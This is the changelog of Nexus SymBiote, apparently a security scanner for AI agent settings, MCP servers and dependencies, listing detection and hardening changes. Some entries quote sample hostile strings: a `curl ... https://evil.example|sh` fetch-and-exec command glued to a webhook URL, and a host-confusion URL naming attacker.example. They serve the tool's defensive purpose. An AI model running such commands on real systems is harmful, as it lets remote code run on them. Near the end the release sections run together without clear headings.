# Changelog

Notable changes to Nexus SymBiote, newest release first. Within a release, security changes come first, and changes that need action from users are marked **Breaking**.

## [Unreleased]

### Security

- Hook command classification checks each pipeline segment once, preventing repeated downloader or decoder names in a settings file from causing quadratic scan time while retaining late fetch-and-exec findings.
- Hook commands are rated by what they run. A hook that downloads and pipes a script to a shell is critical, and a hook that contains a URL is high; other hook commands stay medium. The command text is still not recorded. An HTML or Markdown comment in an instruction file is high when it contains an imperative, a URL or a path under `~/`, and low otherwise. The comment text is still not recorded.
- An exact top-level pin of an `npx`, `npm exec`, `bunx`, `bun x`, `pnpm dlx`, `yarn dlx`, `uvx`, `uv tool run` or `pipx run` package is a medium `transitive_resolution` finding. Those runners resolve the package's dependencies at launch, and a project lockfile does not cover that install.
- `advisories --exclude` matches npm names in any case, and refuses a pattern with a `*` anywhere but at its end instead of sending the name it could never match. A scoped registry's package name and both values of a shadowed header are withheld.
- Secret redaction covers keys, escaped quotes and Negotiate/NTLM credentials, and A2A card signature headers shaped like credentials are withheld.
- The workflow checker closes ways a workflow change could pass it: `action.yml` files beside workflows, a gate in a step that continues on error, interpreter and shell options that run code, heredocs before the command, array assignments, and pinned actions whose version it cannot read. The lock checker requires every hash line to be a single SHA-256 hash.
- `runtime` refuses ambiguous descriptors, non-UTF-8 or BOM-prefixed JSON and patterns Python cannot compile, and removes partial key and envelope files after a failure. A policy path that is not a regular file is refused before it is opened.
- Collectors check every declared MCP endpoint for transport security, rate a PyPI package from a plain `http://` URL high, transport-check RAG locators written without a URL, recognise host-root and broad Docker mounts, and fail closed on a quoted command word glued to more text.
- The CI, Action and floor locks pin `dnspython` 2.9.2 instead of 2.9.1, which advisory GHSA-vvf4-9x63-8xvv affects. `dnspython` is a transitive dependency of `email-validator`, and the Action installs it from `requirements-action.lock`. The locks' upload cut-off moves to 2026-11-07; every other CI and Action pin is unchanged, and the floor lock's unpinned transitive dependencies resolve again at that cut-off.

### Changed

- **Breaking:** a policy file accepts only the documented `validate` key, and an unlistable root is an error. `verify-artifact` and `verify-discovery` reject `--trust-root` or `--trust-root-sha256` without `--bundle`.
- `risk` prints an unscored run as unscored, labels a failed discovery-producer check as such rather than as a failed project reconciliation, and, like `summary`, orders severity breakdowns from critical to info. `vex` and `advisories` print why an inventory could not be read.
- PydanticAI tool references include the agent name, so tools of two agents with the same name no longer collide, and agent tools registered outside the decorator form are reported as gaps.

### Fixed

- TypeScript collection records SDK uses hidden by `eval` wrappers, URL queries and fragments, and method names, and records nothing from ambient declarations. Python collection judges a helper only when a call must reach its definition, reads git revisions where pip and uv read them, and counts module literals behind `*` and `**`.
- Claude settings with an invalid `permissions` value keep their other declarations, and keys the redaction makes equal keep every value in the drift digest.
- Lockfile collection binds pnpm and Yarn records only to what they resolve and checks Python lock versions against every declaration; a private Python index is named in the package URL.
- Confined reads report each refusal once under its root-relative path, report every spelling of a default-excluded name, and charge the byte budget only when a read passes it. Merged ONNX tensors are refused, GGUF keys are read up to a NUL, and a pickle that cannot be disassembled is rated unknown.
- Generators write `save` atomically and never through a link, recover 0.1.0 exports under the 0.1.0 package identifier rule, export MCP launcher package URLs only for a matching ecosystem, reject control characters and IDNA hosts in SPDX namespaces, and accept only well-formed CycloneDX BOM-Links.
- `minimum-elements` treats blank fillers around a placeholder as the placeholder, and a format 1.0 agent named after its checkout as having no System name. An MCP server links to its image on any registry, a lineage loads again after a withdrawal, and remote-only tools stay out of local calls a trace cannot rule out.
- The guides show the property names and severities `diff` reports, and tests that could not fail, or failed for a reason other than the one they name, now check the behaviour they describe.
- The test suite's linear-time checks (`tests.support.scaling_ratio`) time each run with the cyclic garbage collector off, as `timeit` does. A full collection costs time in proportion to everything the test process holds, so late in the suite it made linear scans read as superlinear and failed the dependency-floor job on `main`.

### Added

- A [collector reference](docs/collectors.md) and a [GitHub Action](docs/github-action.md) page. They hold the per-collector path lists, the coding-agent settings, the Action's gate semantics and the signer-policy setup that the README carried, so the README is now a short landing page. The *protect the gate* workflow moved to [Gate drift in CI](docs/drift-gate.md#protect-the-gate), and the requirements-file and Dockerfile gaps to the [registry collector](docs/registry-collector.md#requirements-files) page.
- An [operational guidance](docs/operational-guidance.md) page that collects the operator and CI practices the documented guarantees depend on: ignoring project policy on untrusted checkouts, job timeouts, sandboxing, keeping operator-owned inputs out of a pull request's reach, and what is not implemented.
- The repository hygiene check rejects invisible and bidirectional characters written literally in source, checks image-wrapped and reference-style links, and finds a stale owner in every spelling of the repository slug.

## [0.2.0] - 2026-11-12

Closes detection gaps listed under 0.1.0's known limitations and others found in review, makes inventories comparable across checkouts and reproducible, and makes every gate say why it failed. New commands sign and verify inventories, compare them with the use an agent's own traces report, report their G7 AI SBOM minimum-element coverage, map their findings to security frameworks, draw them as a graph and export the reviewed agent to Nexus-ShadowScan. Record baselines again after upgrading, as *Upgrading* below describes: the native format, paths, the inferred agent reference and many records change. [Known limitations](docs/known-limitations.md) lists what is still not collected, compared or verified.

### Security

- Digest every IDE settings file the `ide_agents` collector recognizes, now also `.cursor/cli.json`, the Antigravity, xAI and Copilot settings and all of `.codex/config.toml`, so a widened Cursor CLI allow list or a new Codex `notify` command is a high drift alert. These files are digested after redaction: their digests cannot confirm a guess of a redacted value, such as a token, and without `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` a change only to a redacted value does not alert, and the record carries a low `completeness` finding that names the key. The redaction ends a URL or an assigned value at a shell operator and starts a new URL at each later scheme, so a command or operator glued to one without white space (`https://hooks.example/n;curl${IFS}https://evil.example|sh`), or a second host glued after an operator or a scheme (`--webhooks=https://hooks.example/n,https://evil.example`), still alerts, while other text glued to a URL stays part of its redacted path, and without the key a URL whose authority URL parsers read differently, such as `https://attacker.example\@corp.example`, is a collection failure that fails the scan gate instead of a digest that hides a change of host.
- Report the unassigned default-ignorable code points U+2065 and U+FFF0 to U+FFF8 as high `invisible_characters`, and U+E0080 to U+E00FF and U+E01F0 to U+E0FFF as critical `tag_characters`, in every text file the `prompt` collector reads, and neutralize them in terminal output. A skill or command resource that is not strict UTF-8, such as a UTF-16 file with a byte-order mark or UTF-8 text with one stray byte, is now checked as an agent's reader decodes it instead of being skipped as binary; in a file that also holds a NUL byte, only runs of four or more hidden characters are reported, and every plane-14 character, such as a tag character, once 16 of them lie within 4,096 characters, whatever separates them ([known limitations](docs/known-limitations.md)). Output now also neutralizes the assigned default-ignorable code points that are not format characters, such as variation selectors (U+FE00 to U+FE0F, U+E0100 to U+E01EF), blank fillers (U+115F, U+1160, U+3164, U+FFA0), U+034F and the Mongolian and Khmer ones, in the terminal, CI logs, SARIF, the HTML graph, Markdown and the attestation subject name, so text hidden as variation-selector bytes no longer passes through; `export-inventory` refuses them as it refuses format characters.
- Check the Hugging Face chat templates in a model's configuration, `chat_template.jinja`, `chat_template.jinja2` and `additional_chat_templates/*.jinja` for the sandbox-escape shapes GGUF templates are checked for: a match is a critical `serialization_format` finding on every model in the directory, and a model that would be rated `safe` is rated `unsafe-template-injection`; a template larger than `file-bytes` is a coverage gap. Templates are matched as Jinja reads them, with Unicode whitespace and string escapes, including a backslash before a line break, decoded, a template directory linked within the project is read through the link, and another case spelling of an absent model configuration, tokenizer or template name is a failure.
- Report a `.git`, `node_modules`, `__pycache__`, `.venv` or `venv` entry inside a skill, command, rule, instruction or subagent directory as a coverage gap instead of skipping it silently; the entry is still not collected.
- Collect nested `GEMINI.md` and `.cursorrules` files, and follow the `@path` imports of nested `GEMINI.md` files.
- Inventory MCP servers in `.js`, `.mjs`, `.cjs`, `.jsx`, `.mts`, `.cts` and `.tsx` files, and servers built through a namespace import, as `.ts` servers are; SDK uses the analysis cannot follow, such as `require`, `import()`, a default import, a re-export or an `npm:`, `jsr:` or URL specifier, are coverage gaps instead of silent skips ([TypeScript inventory](docs/typescript-inventory.md#gaps)).
- Report application code that starts or reaches an MCP server, such as `StdioServerParameters`, `MCPServerStdio`, `MultiServerMCPClient` or `StdioClientTransport`, a Python launcher or server class imported without a use, which another module can import from that file, or imported from any module other than its package (for a server class, any module other than those the tool collector reads it from), a Python launcher or server class reached as an attribute of a module a file holds, and a Python call whose first argument is a literal MCP module name, whatever the callee, as coverage gaps; declare such a server in an MCP client file to have it inventoried.
- `verify-attestation` refuses a trusted key inside a git working tree that holds the subject, the envelope or the current directory, also under another name for that tree, and a key file with other hard links. This catches a key the change under review could supply by its path in the checkout; it does not authenticate the key.
- Classify MCP launchers behind wrappers such as `sh -c` and for more package runners such as `pnpm dlx` and `uv run --with`; a known runner that cannot be classified, inline code or a nested launch is a high `launcher_identity` finding and a coverage gap.
- Withhold an MCP package identity whose registry is redirected, for example by `.npmrc`, and count an MCP container image as pinned only by digest.
- Read MCP servers from the files of eleven clients and from `.mcp.json`-style files in any subdirectory; without `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`, MCP and RAG values that only the key binds cannot alert, and raise a low `completeness` finding.
- Collect nested `CLAUDE.md` and `AGENTS.md` files, `@path` imports, rule, prompt and subagent directories, and every file of a skill; a fixed-path file present only under another case, such as `claude.md`, is a collection failure.
- Report another spelling of an instruction file the `prompt` collector reads at any depth, such as `pkg/claude.md` or `a/b/Agents.md`, which a case-insensitive file system opens as `CLAUDE.md` or `AGENTS.md`, as a collection failure, also beside the exact name, instead of passing it unseen; `CODEX.md` and `codex.md` are both still read. A spelling that a subagent, rule, prompt, skill or command directory inventories, such as `.claude/agents/gemini.md`, is not a failure, and its `@path` imports are followed when it spells `CLAUDE.md` or `GEMINI.md`.
- Record on each inventoried npm or PyPI package the project settings that can send it to another registry or index: `.npmrc` default and scoped registries (for npm, pnpm, Yarn 1 and Bun alike, with npm's `scope`), `.yarnrc`, `.yarnrc.yml` and `bunfig.toml` registries, `--index-url`, `--extra-index-url`, `--find-links` and `-i` in requirements files, the project's `pip.conf` and `pip.ini` (`pypi-url` included), uv indexes and `uv.toml`, and Poetry and PDM sources. Each is recorded by origin only (scheme, host and port, never credentials or paths) in `package_sources`; the package gets a low `registry_origin` finding and no package URL, because its name and version no longer identify what is installed. An unreadable redirect file is a collection failure, and an ambiguous one, such as a `.npmrc` setting name taken from the environment or a `pip.conf` pip would refuse, a coverage gap ([registry and index settings](docs/registry-collector.md#registry-and-index-settings)).
- Bind Claude Code settings by digest, so an added hook or a removed deny rule alerts, and score `bypassPermissions` (high), `acceptEdits` (medium) and hooks.
- Match AI packages after name normalization against one [catalog](docs/registry-collector.md#ai-package-catalog), so `mcp`, `fastmcp`, `@anthropic-ai/sdk`, `llama.index.core` and `langgraph-checkpoint` are inventoried.
- Resolve versions from pnpm, Yarn, uv and Poetry lockfiles, fail on npm, pnpm and Yarn records with SHA-1-only integrity or a non-HTTPS or ambiguous download URL, and report overrides, workspaces and a `Pipfile` as coverage gaps.
- Digest every weight shard, configuration, tokenizer, chat template and custom-code module of a model, rate Hugging Face custom code high, and detect pickles behind any model suffix ([model integrity](docs/model-integrity.md)).
- Count a tool descriptor as verified only when it matches the project's MCP configuration, and refuse supplier claims of verified assurance that no local evidence backs.
- Keep checkout and inventory text inert in all output: it cannot start a line or form a CI log command (`##[`), markup or a link.
- Let only the operator set collection limits, and run several parsers that one hostile file could stall, JavaScript comment stripping among them, in linear time.
- In live mode, refuse special-purpose addresses, bound server schemas and OSV replies, and ignore `SSLKEYLOGFILE`; `verify-live` also binds server instructions, prompts and identity.
- In the runtime gateway, retire superseded snapshots, count approvers rather than keys, and deny every call when the state store is missing.
- Publish to PyPI only from a signed tag after 24 hours on `main`, unless an urgent fix states why, and check dependencies against OSV daily.
- Classify MCP launch text that a shell or `cmd` reads again only when every word reads as written: brace, pattern and parameter expansion, `$'...'`, `eval`, `cmd`'s `@ ; , =` prefixes and `%VAR:~%` substrings are a coverage gap, and arguments are also read as a shell may rewrite them ([known limitations](docs/known-limitations.md#mcp-servers-and-tools)).
- Treat `uv run` of a URL or standard input, Windows names with trailing dots such as `npx.cmd.`, and package installs (`pip`, `gem`, `cargo`, `conda`) as unknown launchers, and withhold an MCP package identity when the server's environment moves or replaces the runner's configuration.
- Withhold token-shaped MCP field, header and environment names from inventories and exports.
- Redact a token after a prefix in a name (`AWS_AKIA...`, `X_glpat-...`) and an MCP server or tool name that is a token, and treat `pip3.12`, `gem i` and a `pip install` after any run of options as package installs. `cmd /c` command lines keep backslashes and single quotes as cmd does, so `'npx'` is a gap rather than `npx` and `C:\nodejs\npx.cmd -y pkg@1.2.3` is read as `npx`.
- Treat as unknown launchers a shell given `--rcfile` or `--init-file`, also spelled with one dash, which bash sources when interactive or when its standard input is a socket, as MCP clients provide; an exported bash function in the server's environment (`BASH_FUNC_<name>%%`, Apple's `__BASH_FUNC<name>()`, or any value starting `() {`); a `BASH_ENV` that is not an absolute path, counting paths with a `..` segment or under `/proc` or `/dev/fd` as relative; `ENV` with an interactive shell (`-i` or `-o interactive`); and a `PS4` with an expansion while the shell traces its commands. Each can replace the runner the script names. `SHELLOPTS`, `BASHOPTS` and `PS4` otherwise count as code-loading environment.
- Read brace, bracket, pattern and parameter expansions in MCP launch arguments in linear time and bounded memory: a few kilobytes of unclosed braces stalled a scan, a 128 KB brace list took 3.9 GB, and a long `*` pattern took 30 s to compile. Default operands nested more than eight deep and braces open more than 256 deep are a gap, and inline JSON arguments no longer exhaust the scan budget. Pattern readings are matched against the program names that their literal text allows, and each compile is charged.
- Follow the `@path` imports of nested `CLAUDE.md` files, and treat an A2A card module that is too large to parse or spelled with compatibility characters as a coverage gap.
- Find MCP package-source origins and analyze Python MCP servers in time linear in the file size: a long `.npmrc` value held the `mcp` collector for 25 s at 160 KB, and a server passed to a large helper from many calls took quadratic time.
- **Breaking:** the runtime gateway passes canonical arguments by default (`canonical_arguments=True`), so `resolve_scope` and `execute` receive the RFC 8785 value the approval binds, and it validates and resolves the scope of those arguments; an integral float outside the I-JSON range is refused in every mode, and schemas that use keywords only drafts before draft-04 define are denied. Pass `canonical_arguments=False` only for an executor that needs the caller's own encoding.
- Measure the PyPI soak only from a commit's push run, so a commit without one, such as a `[skip ci]` push, needs a stated override; require the publishing environment to admit only `main` rather than every protected branch; treat an unreported ruleset bypass as unknown; and reject workflow gate steps that never run, and gate commands that are quoted, conditional, negated, chained, backgrounded, preceded by `set +e`, `set -n`, `cd`, `trap`, `exit` or `hash` (also through `builtin`, `command`, `shopt -o` or an expanded command name), run through a `$VAR` that `export`, `declare`, `read` or a loop rebinds, passed as an option's value such as `python -X`, or run under another shell or working directory. Scripts the checker reads differently from `bash` (`$'...'` escapes, partly quoted here-document delimiters, here-documents and comments inside `$(...)`) no longer yield a gate.
- **Breaking:** record the ShadowScan discovery verification outcome in the BOM, and fail unverified discovery evidence in CI. Importing a report writes `metadata.completeness.discovery_verification` (`verified` with the signer identity and issuer, otherwise `unverified`) with the report digest and the report's own run time; the repository and commit are recorded as `unknown` because the ShadowScan report format carries neither. The record is unsigned, so it is reported but never trusted: only a producer check in the same run counts as verification (`import-shadowscan --bundle`, or `validate`/`risk --project --signature-policy`). Otherwise `import-shadowscan` (with or without `--report-only`), `validate` and `risk` warn loudly, and fail the run when a CI variable (`CI`, `GITHUB_ACTIONS` and the like) is set unless `--allow-unsigned-discovery` is passed; `--fail-on-unsigned-discovery` forces failure anywhere, and passing both is a usage error. `risk --json-output` reports such a failure with the same keys as a scored report, and `validate` records it as `unsigned_discovery`. The Action takes an `allow-unsigned-discovery` input.
- **Breaking:** verify the Sigstore trust root before trusting it. Offline verification now fails closed when the sigstore-python cache directory or `trusted_root.json` is group/world-writable, a symlink, or owned by someone else; a missing cache is created mode 0700. Pass an explicit trust root with `--trust-root` on `verify-artifact`/`verify-discovery` (optionally pinned with `--trust-root-sha256`), or `NEXUS_SYMBIOTE_SIGSTORE_TRUST_ROOT` for any verification path, and the verification output prints the trust-root path used. A verify that passed on a shared or group-writable cache now exits 1 until the cache is made private or a trust root is supplied.
- Verify against the cached Sigstore trust root from the bytes that were checked. The cached `trusted_root.json` is now opened once without following symlinks, checked on that descriptor and read, and the verifier is built from those bytes; before, sigstore-python read the file again by path after the check, so a process running as the same user could replace it in between. A missing cached root is created mode 0600 from the root embedded in sigstore-python, as sigstore-python did.
- **Breaking:** bind each `risk.suppressions` entry to the finding it accepted. An entry now requires the finding's `fingerprint`, which `risk --json-output` and human-readable `risk` print for each finding: a digest of its component, category, severity and detail, and of the component's content digest (`content_hash`, `definition_hash`, `schema_hash` or the `sha256` file hash) when the inventory records one. A finding whose detail, severity or reviewed bytes changed, such as a prompt whose one bidirectional override grew to 31 or now reverses a different instruction, is no longer suppressed and counts again, and the entry is listed under `suppressions_stale`; before, an entry covered the component and category whatever the finding became. A policy with an entry that has no fingerprint is refused ([suppressions](docs/policy-reference.md#suppressions)).
- Count runtime quorums over unrevoked signers: a signature from a revoked or unbound key appended to a valid envelope no longer makes it fail, and never counts towards a threshold. Collection limits are kept per context, the offline guard stays in force until its last overlapping user leaves, a state store whose identity changed in place is refused, and `runtime keygen` creates key files without following links.
- Require the exact spelling of every path component in confined reads on case-folding file systems, and refuse a policy file under another case. A signer policy entry that names its artifact or bundle in another case is refused there as it is on a case-sensitive file system. A runner started with a path or an interpreter instead of a package entry point, and `npm exec` options after the package, are unknown launchers; `deno.json` and bunfig preload, shell and CA settings are read as resolver configuration; SSE lines may end in a bare carriage return within the response bound; and `hf_` tokens and raw `Authorization` and cookie header values are redacted.
- Refuse a byte-order mark in strict JSON, read `image:sha256:` and tag-plus-digest references as digest pins and a tag without a dot as unpinned, apply a model's intrinsic risks in `diff`, SARIF and VEX, and export a package URL only when the component's registry agrees with it.
- Stop the release provenance step explicitly when an expected distribution or attestation is missing or is a symbolic link, run the platform smoke workflow on pull requests with the confinement suites, and refuse a `scanners` subset in the Action while `validate` is on.

### Changed

- **Breaking:** `scan`, `baseline` and `import-shadowscan` exit 2 before collecting when `SOURCE_DATE_EPOCH` is set to anything but 1 to 12 ASCII digits naming an instant up to 9999-12-31T23:59:59Z (253402300799), an empty value included; unset it, or set it to a whole number of seconds such as the commit time.
- **Breaking:** more inputs are coverage gaps, which fail the default gates: a `.git`, `node_modules`, `__pycache__`, `.venv` or `venv` entry in an agent configuration directory, an MCP server that application code starts or reaches, and MCP SDK uses the source analysis cannot follow. Remove such an entry; the other gaps remain as long as the code does, and declaring a server that code starts in an MCP client file inventories it without clearing the gap.
- **Breaking:** IDE agent records also digest `.cursor/cli.json`, `.codex/config.toml` and the Antigravity, xAI and Copilot settings files, so `diff --fail-on-alert` against a baseline an earlier build recorded alerts on a project that has one; record the baseline again.
- **Breaking:** write native format 1.1.0, with paths relative to the scan root and a repository agent reference that no longer depends on the checkout; most records bind more evidence, so a 0.1.0 inventory still loads but no longer reconciles or compares cleanly.
- **Breaking:** `diff --fail-on-alert` also alerts when a component disappears or a relationship is added or removed ([drift gate](docs/drift-gate.md)).
- **Breaking:** SARIF rule ids are `nexus_symbiote/<category>/<severity>`, so GitHub code scanning re-creates every alert once, and again when a finding's severity changes; dismissals do not carry over ([details](docs/fingerprint-migration.md#sarif-rule-identifiers)).
- **Breaking:** the runtime gateway evaluates tool input schemas in their declared dialect with ECMA-262 patterns and denies a schema holding a constraint that dialect would skip; stores need `StateStore.initialize` ([reference](docs/runtime-contract-reference.md#input-schema-evaluation)).
- **Breaking:** both pre-commit hooks run `nexus-symbiote scan . --no-project-policy --check`: they ignore the checkout's policy and write no file.
- **Breaking:** in the Action, `risk-threshold: '0'` no longer skips the risk gate, `risk-passed` can be `not-run`, and the Action's Python no longer stays on the job's `PATH`.
- **Breaking:** `validate`, `risk`, `diff`, `summary` and `blast-radius` print results on standard output, and `advisories` exits 1 when it finds an advisory.
- **Breaking:** every command refuses a signer policy inside the scanned project, and `verify-live` requires `--project` and a launch policy outside the repository.
- **Breaking:** the MCP stdio note moves from category `transport_security` to `local_process`.
- **Breaking:** dependency floors rise to click 8.2.1, pydantic 2.12, packaging 24.2 and jsonschema 4.25; the `yaml` extra is gone, `dev` is now a dependency group, and the unused `rich` dependency is dropped.
- Give every finding category, and `runtime_undeclared`, its own SARIF rule title and description, and tag each rule from the [framework crosswalk](docs/framework-crosswalk.md#sarif-tags) with the CWE, OWASP Top 10 for LLM Applications 2025 and 2026, OWASP Top 10 for Agentic Applications, MITRE ATLAS and NIST AI RMF entries its findings bear on; 0.1.0 rules carried no tags. EU AI Act and ISO/IEC 42001 references are not tags; the `crosswalk` report gives them.
- The release workflow's evidence scan runs with `SOURCE_DATE_EPOCH` set to the commit time, so the published `project.cdx.json` records that time as its collection time.
- Raise default limits to 100,000 directory entries and 64 GiB per model file ([collection limits](docs/collection-limits.md)).
- Make the `mcp` collector's bound on syntax nodes in one Python file an operator limit, `python-nodes` (default 200,000; `--limit python-nodes=N` or `NEXUS_SYMBIOTE_LIMITS`). It was a hidden, fixed 20,000 that ordinary modules exceeded, so the default gate failed; reaching it is now a collection failure that names the limit and how to raise it ([collection limits](docs/collection-limits.md)).
- The Action's `scanners` input says that a list leaving any collector out makes coverage partial, so `validate` and `risk-check` fail.
- Export CycloneDX and SPDX through projection 2, which makes the repository agent CycloneDX `metadata.component` and mints SPDX `urn:uuid` identifiers; 0.1.0 exports still recover ([standard exports](docs/standard-exports.md)).
- **Breaking:** emit deterministic native JSON, CycloneDX and SARIF output. `serial_number` is now `urn:uuid:` and the uuid5 of the inventory content digest that `digest` prints (`nexus-symbiote/inventory-content/v1`, which leaves out the serial number, the collection times and the location an imported report was read from), instead of a random uuid4, so anyone can recompute it from the native file. No wall-clock timestamp is stamped on collection or export, so two scans of the same project are byte-identical (SARIF only when both scans run from the same place relative to the scanned directory, since its URIs are relative to the working directory); `SOURCE_DATE_EPOCH` records a collection time without changing the serial. SPDX keeps a wall-clock `CreationInfo.created` when the inventory records no time, because its schema requires one; that is the only varying field. Native JSON lists components in canonical `bom_ref` order and dependencies in a canonical order rather than collection order. An inventory recorded before this change has a different serial number, so record baselines again.
- Declare the distribution license as `MIT AND Apache-2.0 AND Community-Spec-1.0 AND CC-BY-3.0`: pre-existing portions of the vendored SPDX 3.0.1 specification are provided under Creative Commons Attribution 3.0.

### Fixed

- Bound every collection failure and gap listing, report a case variant once per file however many links reach it, and refuse symbolic links whose target is not valid UTF-8, so a hostile tree of links no longer takes gigabytes or writes an unloadable inventory.
- Read each pnpm lockfile key once, and read YAML base-60 numbers such as `1:30` as text, removing two parsers whose time was quadratic in a hostile file.

### Upgrading

1. Re-collect each baseline from the commit it was reviewed at, with the same `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` as your CI scans, or none, and review `diff old.json new.json` once before adopting it ([drift gate](docs/drift-gate.md#take-both-snapshots-the-same-way)).
2. In CI, verify ShadowScan reports (`import-shadowscan --bundle`, or `validate`/`risk --project --signature-policy`), or accept unsigned discovery evidence explicitly with `--allow-unsigned-discovery` (the Action's `allow-unsigned-discovery: 'true'`).
3. Review the new findings and coverage gaps; a gap fails the default gates. Accept a single false positive with `risk.suppressions`, and add to each existing entry the `fingerprint` of the finding it accepts, after reviewing the finding as `risk --json-output` now reports it; replace `transport_security` with `local_process` where a policy ignores stdio notes.
4. In the Action, use `risk-check: 'false'` to skip the risk gate, give each Action step in one run its own `artifact-name` and `sarif-category`, and install Python in later steps that used the Action's.
5. In scripts, read results from standard output, gate on `risk --json-output`, add `--no-fail-on-advisory` where `advisories` must exit 0, and pass `--project` to `verify-live`.
6. Keep signer and launch policies outside the scanned repository, and re-apply the GitHub code scanning dismissals that still hold.
7. Where a CI job exports `SOURCE_DATE_EPOCH`, make it a whole number of seconds or unset it before `scan`, `baseline` and `import-shadowscan`; where an inventory must record when it was collected, set it, because without it none is recorded.

### Security

- **Breaking:** read `.nexus-symbiote.yaml` only from the project being scanned or named with `--project`. Policy discovery walked every parent directory up to the filesystem root, so a policy file outside the checkout, in a shared workspace parent or in `/tmp`, could skip `validate` checks, hide paths from `scan` and disable the severity gate. `risk` and `validate` also no longer take a policy from the directory an inventory file sits in, which could be `/tmp` or a shared folder: without `--project` they use the built-in policy and name any `.nexus-symbiote.yaml` they did not apply. A policy kept above several scanned subprojects must be copied into each project root, and a gate that relied on a project policy must pass `--project`, which for `risk` also reconciles the inventory against that project. The shipped `nexus-symbiote-risk` pre-commit hook now passes `--project .`, so it applies the repository's policy as the `nexus-symbiote-scan` hook does.
- Reject runtime contract predicates that are not in canonical form. A snapshot signed by a generic DSSE tool with the same contract encoded differently (for example `+00:00` timestamps or omitted default fields) verified under a subject digest that differed from the gateway's revocation and approval identity, so revoking that subject digest was silently ineffective. `runtime verify` now prints the canonical `digest`. `sign_contract` refuses a contract that does not validate or is not in canonical form, so the signer's own digest of a contract is always the digest its envelope binds, and revocation entries must be canonical `sha256:` digests (or 64-digit key IDs for signers): a bare-hex or uppercase entry was compared verbatim and silently ignored, and is now rejected. A timestamp that falls outside the representable range once converted to UTC is now a validation error instead of an uncaught `OverflowError`.
- Cover the C socket type in the offline guard. `_socket.socket` (also `socket.SocketType`) is immutable, so its `connect`, `connect_ex`, `sendto` and `sendmsg` were not replaced and a direct caller could open a connection while a command ran offline; a host-name address was even resolved, sending a DNS query, before any guarded call ran. A CPython audit hook now refuses, for the duration of an offline command, creating any socket other than a Unix-domain socket, the connect and send events, name resolution and process creation, and the guard also replaces the `fork_exec` reference that `subprocess` captures at import. urllib3's import-time IPv6 probe runs before the guard starts, so Sigstore's offline verifier keeps working. A socket created before the command started is not covered: it can still use an existing connection, because `listen`, `accept`, `send` and `recv` raise no audit event, and resolve a host name through `bind`, `connect` or `sendto`.
- Make a checkout-supplied policy relaxation visible. `validate` prints the governing policy source, `risk` records `policy_source` and `policy_weakened` in JSON output, and in human-readable output both print a warning on stderr when a project policy switches off a check, lowers the severity gate, raises the threshold, ignores categories, selects report-only collection or a scanner subset. The warning, and the error for an invalid policy file, neutralize line breaks, terminal controls and invisible format characters from the checkout, so it cannot hide them or forge CI commands. Gate semantics are unchanged; `--no-project-policy` still ignores the file.

Heredoc bodies of `RUN`, `COPY` and `ADD`, also after `ONBUILD`, are skipped, and a `FROM` naming an earlier build stage is not an image.
  - These are coverage gaps: a `FROM` image with an ARG substitution (`FROM image substitution not resolved`) or with quotes or escapes (`FROM image quoting not resolved`); a `FROM` without an image or with a quoted or escaped flag (`FROM instruction not parsed`); a heredoc that cannot be parsed or is not terminated (`heredoc not parsed`); and an escape parser directive other than a backslash (`escape parser directive not followed`).
- Translate `[tool.poetry]` dependencies in the `registry` collector, including the `dev-dependencies` and `group.*.dependencies` tables, to PEP 508 instead of joining name and version: `torch = "2.3.1"` was recorded as the package `torch2-3-1`. A bare version is an exact pin, caret, tilde and wildcard constraints become ranges, and extras, markers and platform are kept. A git, path or URL dependency, a dependency with a `source` other than PyPI, and a condition that does not translate (a `||` union or a `python` restriction) are recorded by name with a coverage gap. An invalid dependency is a collection failure.

### Fixed

- Read every `requirements*.txt` in the project root in the `registry` collector, as documented, matching names without regard to case. It read only `requirements.txt`, `requirements-dev.txt` and `requirements-ml.txt` and still reported complete coverage. It now joins continued lines as pip does, with nothing in between, and ignores per-requirement options such as `--hash`, so hash-locked files no longer fail, and it strips a UTF-8 byte order mark, so the first requirement of such a file is no longer skipped without a finding. A newly read entry that is not a readable regular file, is not UTF-8, or has a line naming an AI package that is not a valid requirement is reported as a collection failure, as such a `requirements.txt` already was, and a file whose name holds undecodable bytes or a control or format character is reported as a failure and not read. All root requirements files together are read up to 4 MiB; beyond that the rest are reported as a collection failure and not read, so scan time stays bounded. A package declared more than once in requirements files, in one file or several, becomes one component instead of a conflicting duplicate that failed the scan (identical lines in one file were already merged), and a `pyproject.toml` declaration of a package already declared, previously dropped, is recorded on that component too. A finding is raised only when two declarations under the same markers conflict: two exact pins neither of which admits the other (`==2.3.0` admits the local build `2.3.0+cpu` that a lock file records, so those do not conflict), an exact pin outside another declaration's range, or a direct URL reference whose origin another declaration does not share. A range and a pin that satisfies it, as pip-tools, uv and lock files write them, do not conflict. Ranges are not compared with each other; declarations under different markers, such as the platform splits `uv export` writes, or in different `[project.optional-dependencies]` groups, such as uv's `cpu` and `cu121` extras, are not compared; the extras a requirement names, such as `openai[datalib]`, are not compared; and a declaration that cannot be parsed is reported as a collection failure instead. The comparison takes time linear in the size of the files read; a declaration with a version longer than 128 characters is recorded but not compared. Each declaration from a requirements file or the `[project]` table is recorded, redacted, so a change to its version, marker, extras or URL scheme, host or port reaches `diff`; `[tool.poetry]` dependencies are covered by a separate entry. A direct URL or VCS reference containing `//` keeps only its scheme, host and port, taken from the whole parsed URL so that a quote inside it cannot leave the rest behind, and a line that cannot be parsed is recorded only up to the word that holds its first `//`, because a path or query can carry credentials; a change within the same origin therefore does not reach `diff`. Such a URL without a host is replaced entirely, and a reference written without `//`, such as `file:/path`, or a relative path is recorded as written. Options are split from a requirement on spaces only, as pip does, so a tab or another space character stays inside the requirement. Includes, constraints files, editable installs and URL, VCS and path requirements are covered by a separate entry; the targets of references are still not fetched.
- End a command with a plain error, not a Python traceback, when its output path cannot be written safely: a symbolic link on the way, a missing directory, or a directory as the target. Other failures, such as a permission error or a full disk, are reported by the system's message, without the path. This applies to the `-o`/`--output` file of every command and to `init --path`; `runtime keygen` still ends such a failure with a traceback. `init --path` follows the same rule instead of writing through a symlinked directory, `vex` and `advisories` also refuse a second name for their input, such as a hard link, and no command replaces a device, FIFO or socket named as its output. `..` in an output path now steps to the real parent directory, as the operating system resolves it, instead of being refused.
